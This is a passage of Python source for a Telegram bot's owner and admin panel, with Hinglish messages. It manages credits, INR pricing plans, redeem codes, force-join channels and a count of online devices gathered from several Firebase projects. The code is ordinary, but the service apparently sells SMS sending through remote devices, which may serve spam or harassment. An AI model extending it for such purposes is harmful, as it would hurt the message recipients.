    except TelegramBadRequest: pass

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Admin Only!", show_alert=True)
        return
    await safe_answer(cq, "⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        ensure_scan_running()
        devices = []

    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi — {em(EMOJI_GEAR, '🔄')} scan background mein chal raha hai (~3-4 min)")
    for dv in devices:
        dev_lines.append(f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b> — {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:20]}")
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await cq.message.edit_text(
        full,
        reply_markup=kb([
            (f"{sc('refresh')}", "admin:stats"),
            (f"{sc('back')}", "admin:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"

    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join Settings</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        req = f"{em(EMOJI_CHECK, '✅')} Required" if ch.get("required", True) else f"{em(EMOJI_CROSS, '❌')} Optional"
        text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n  {req} | {ch['link']}\n\n"

    rows = [
        [btn("aᴅᴅ ᴄʜaɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("rᴇᴍᴏᴠᴇ ᴄʜaɴɴᴇʟ", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [InlineKeyboardButton(
            text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
            callback_data="owner:fj:toggle"
        )],
        [btn("ʙaᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🔗')} <b>Add Force Join Channel</b>\n\n"
        f"{sc('step 1/2')}: Channel/Group ka Telegram ID bhejo:\n"
        f"<i>Example: -1001234567890</i>\n\n"
        f"<b>Note:</b> Bot ko us channel/group mein admin hona chahiye.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_channel, F.text)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        ch_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid channel ID bhejo (numbers only, e.g. -100xxx).", parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"{em(EMOJI_BELL, '🔗')} <b>{sc('step 2/2')}</b>\n\n"
        f"Channel/Group ka invite link bhejo:\n"
        f"<i>Example: https://t.me/+AbCdEfGhIjK</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_link, F.text)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid link bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))

    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except:
        title = "Channel"

    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Channel Added!</b>\n\n{em(EMOJI_BELL, '📢')} {title}\n{em(EMOJI_GEAR, '🔗')} {link}",
        reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await safe_answer(cq, "❌ Koi channel nahi hai!", show_alert=True)
        return

    rows = []
    for ch in channels:
        rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙaᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>\n\nKaunsa channel hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d)
    await safe_answer(cq, "🗑 Channel removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    status = "ENABLED" if fj["enabled"] else "DISABLED"
    await safe_answer(cq, f"Force Join {status}!", show_alert=True)
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])

    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal Plans: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        ptype = plan.get("type", "coins")
        if ptype == "duration":
            pt = f"⏱ {plan.get('days', 0)} {sc('days')}" + (f"  🔓 {sc('unlimited')}" if plan.get("unlimited") else "")
        else:
            pt = f"{em(EMOJI_MONEY, '💰')} {plan.get('credits', 0)} {sc('credits')}"
        text += f"{i}. <b>{plan['name']}</b> — {pt}\n"
        for f in (plan.get("features") or [])[:3]:
            text += f"      ✦ {f}\n"
        text += f"   {em(EMOJI_GEAR, '🔗')} {plan.get('payment_link', '')}\n\n"

    rows = [
        [btn("aᴅᴅ ᴘʟaɴ", "owner:pricing:add", EMOJI_CHECK, "➕")],
        [btn("ᴜɴʟɪɪᴛᴇᴅ ᴀᴄᴄᴇss", "owner:pricing:grant", EMOJI_STAR, "🔓")],
        [btn("rᴇᴍᴏᴠᴇ ᴘʟaɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙaᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💳')} <b>Add Pricing Plan</b>\n\n{sc('step 1/6')}: Plan ka naam bhejo:\n<i>Example: Monthly Unlimited / Starter Coins</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:pricing:grant")
async def owner_pricing_grant_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_unlimited_uid)
    await cq.message.edit_text(
        f"🔓 <b>{sc('grant unlimited access')}</b>\n\n"
        f"{sc('user ka ID bhejo')} (jo unlimited access milega)",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.set_unlimited_uid, F.text)
async def owner_pricing_grant_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid user ID bhejo (numbers).", parse_mode="HTML")
        return
    await state.update_data(unlimited_target=int(msg.text.strip()))
    await state.set_state(S.set_unlimited_days)
    await msg.answer(
        f"🔓 <b>{sc('kitne din ka unlimited?')}</b>\n<i>Example: 30</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.set_unlimited_days, F.text)
async def owner_pricing_grant_days(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    fsmd = await state.get_data()
    try:
        target = int(fsmd.get("unlimited_target", 0))
        days = int(msg.text.strip())
        if days < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid din number bhejo (e.g. 30).", parse_mode="HTML")
        return
    d = load()
    u = d.setdefault("users", {}).setdefault(str(target), {"credits": 0, "ref_code": "", "ref_by": 0, "ref_earned": 0, "stats": {"sms": 0}})
    now = int(time.time())
    cur = u.get("unlimited_until", 0)
    u["unlimited_until"] = max(cur, now) + days * 86400
    save(d)
    await state.clear()
    left = unlimited_days_left(target, d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '🔓')} <b>{sc('unlimited granted!')}</b>\n\n"
        f"👤 {target}\n📅 {left} {sc('days')} {sc('left')}\n"
        f"<i>{sc('pehle se tha to extend ho gaya')}</i>",
        reply_markup=kb([("ʙaᴄᴋ", "owner:pricing:menu")]),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(
            target,
            f"🔓 {sc('unlimited access granted!')}\n\n📅 {left} {sc('days')} — {sc('ab credits nahi lagenge')}",
            parse_mode="HTML"
        )
    except Exception:
        pass

@R.message(S.add_plan_name, F.text)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 2/6')}</b>\n\nPrice bhejo:\n<i>Example: 199</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_price, F.text)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        price = float(msg.text.strip())
        await state.update_data(plan_price=price)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid price bhejo (numbers only).", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_type)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 3/6')}</b>\n\n{sc('plan type chuno')}:\n"
        f"💰 {sc('coins')} — user ko credits milte hain\n"
        f"⏱ {sc('duration')} — din-based access (e.g. <b>Monthly Unlimited</b>)",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn(f"💰 {sc('coins (credits)')}", "owner:plan:type:coins", None, "")],
            [btn(f"⏱ {sc('duration (time)')}", "owner:plan:type:duration", None, "")],
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:plan:type:coins")
async def owner_pricing_type_coins(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.update_data(plan_type="coins", plan_credits=0, plan_days=0, plan_unlimited=False)
    await state.set_state(S.add_plan_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💳')} <b>Coins Plan</b>\n\n{sc('kitne credits dena hai?')}\n<i>Example: 100</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:plan:type:duration")
async def owner_pricing_type_duration(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.update_data(plan_type="duration", plan_credits=0, plan_days=0, plan_unlimited=None)
    await state.set_state(S.add_plan_days)
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, '⏱')} <b>Duration Plan</b>\n\n{sc('kitne din ka plan hai?')}\n<i>Example: 30 (Monthly)</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_days, F.text)
async def owner_pricing_days(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        days = int(msg.text.strip())
        if days < 1:
            raise ValueError
        await state.update_data(plan_days=days)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid din number bhejo (e.g. 30).", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_unlimited)
    await msg.answer(
        f"{em(EMOJI_CHECK, '🔓')} <b>{sc('unlimited use chahiye isme?')}</b>\n"
        f"<i>Haan = user ko is period mein bina credit ke unlimited SMS</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn(f"🔓 {sc('unlimited (haan)')}", "owner:plan:unl:yes", None, "")],
            [btn(f"🔒 {sc('limited (nahi)')}", "owner:plan:unl:no", None, "")],
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:plan:unl:yes", "owner:plan:unl:no"}))
async def owner_pricing_unlimited(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    val = cq.data.endswith("yes")
    await state.update_data(plan_unlimited=val)
    await state.set_state(S.add_plan_features)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📋')} <b>{sc('best features')}</b>\n\n"
        f"{sc('features bhejo — har line pe ek')} (max 6)\n"
        f"<i>Example: Unlimited SMS / Fast speed / Priority support</i>\n"
        f"{sc('ya skip karne ke liye')}: <b>skip</b>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_features, F.text)
async def owner_pricing_features(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    txt = msg.text.strip()
    if txt.lower() in ("skip", "-", "none"):
        features = []
    else:
        features = [ln.strip() for ln in txt.splitlines() if ln.strip()][:6]
    await state.update_data(plan_features=features)
    await state.set_state(S.add_plan_link)
    await msg.answer(
        f"{em(EMOJI_GEAR, '🔗')} <b>{sc('aakhri step')}</b>\n\nPayment redirect link bhejo:\n"
        f"<i>Example: {SUPER_ADMIN_LINK} ya koi payment URL</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_credits, F.text)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 1:
            raise ValueError
        await state.update_data(plan_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_features)
    await msg.answer(
        f"{em(EMOJI_STAR, '📋')} <b>{sc('best features')}</b>\n\n"
        f"{sc('features bhejo — har line pe ek')} (max 6)\n"
        f"<i>Example: 100 credits / Fast speed / 24x7 support</i>\n"
        f"{sc('ya skip karne ke liye')}: <b>skip</b>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_link, F.text)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    plan_type = fsmd.get("plan_type", "coins")
    plan = {
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "currency": "INR",
        "payment_link": link,
        "type": plan_type,
        "credits": fsmd.get("plan_credits", 0) or 0,
        "days": fsmd.get("plan_days", 0) or 0,
        "unlimited": bool(fsmd.get("plan_unlimited", False)) if plan_type == "duration" else False,
        "features": fsmd.get("plan_features", []) or [],
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    if plan_type == "duration":
        detail = f"{em(EMOJI_GEAR, '⏱')} {plan['days']} {sc('days')}{' — 🔓 ' + sc('unlimited use') if plan['unlimited'] else ''}"
    else:
        detail = f"{em(EMOJI_MONEY, '💰')} {plan['credits']} credits"
    feat_txt = "\n".join(f"{em(EMOJI_STAR, '✦')} {f}" for f in plan["features"])
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Plan Added!</b>\n\n{em(EMOJI_STAR, '📋')} {plan['name']}\n"
        f"{em(EMOJI_MONEY, '💰')} {plan['price']} INR  {detail}\n"
        f"{feat_txt}\n{em(EMOJI_GEAR, '🔗')} {plan['payment_link']}",
        reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await safe_answer(cq, "❌ Koi plan nahi hai!", show_alert=True)
        return

    rows = []
    for plan in plans:
        rows.append([btn(f"{plan['name'][:25]}", f"owner:pricing:del:{plan['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙaᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>\n\nKaunsa plan hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]
    save(d)
    await safe_answer(cq, "🗑 Plan removed!")
    await owner_pricing_menu(cq, state)

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})

    text = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = f"{em(EMOJI_CHECK, '✅')} Active" if data.get("uses_left", 0) > 0 else f"{em(EMOJI_CROSS, '❌')} Expired"
        text += f"<code>{code}</code> — {em(EMOJI_MONEY, '💰')}{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"

    rows = [
        [btn("ɢᴇɴᴇraᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("ʙaᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n{sc('step 1/2')}: Kitne credits dena hai?\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_credits, F.text)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(gen_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎁')} <b>{sc('step 2/2')}</b>\n\nKitni baar use ho sakta hai?\n<i>Example: 10</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_uses, F.text)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo (1 ya zyada).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)

    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}):
            break

    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits,
        "uses_left": uses,
        "created_by": msg.from_user.id,
        "created_at": int(time.time()),
        "used_by": []
    }
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Code Generated!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} Max Uses: <b>{uses}</b>\n\n"
        f"<i>Users is code se redeem karke credits le sakte hain.</i>",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await safe_answer(cq, "❌ Koi code nahi hai!", show_alert=True)
        return

    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙaᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Delete Redeem Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save(d)
    await safe_answer(cq, "🗑 Code deleted!")
    await owner_redeem_menu(cq, state)

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_uid, F.text)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits add karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_amount, F.text)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d, is_manual=True)
    save(d)
    await state.clear()

    try:
        _ca_bal = get_user_credits(uid, d)
        await send_rich_or_fallback(
            msg.bot, uid,
            rich_credits_blocks("💰 Credits Added!", [f"+{amount} credits mile hain!"], _ca_bal),
            f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n+{amount} credits mile hain!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{_ca_bal}</b>"
        )
    except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> added to <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_uid, F.text)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits deduct karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_amount, F.text)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()

    if success:
        try:
            _cd_bal = get_user_credits(uid, d)
            await send_rich_or_fallback(
                msg.bot, uid,
                rich_credits_blocks("⚠️ Credits Deducted!", [f"-{amount} credits kat gaye."], _cd_bal),
